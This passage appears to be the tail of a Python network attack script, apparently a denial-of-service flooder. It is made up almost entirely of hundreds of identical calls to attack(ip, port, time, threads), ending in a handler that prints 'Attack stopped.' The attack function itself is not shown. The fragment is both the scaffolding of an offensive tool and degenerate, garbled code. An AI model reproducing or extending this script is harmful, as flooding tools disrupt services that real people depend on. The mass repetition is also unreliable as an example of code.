        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')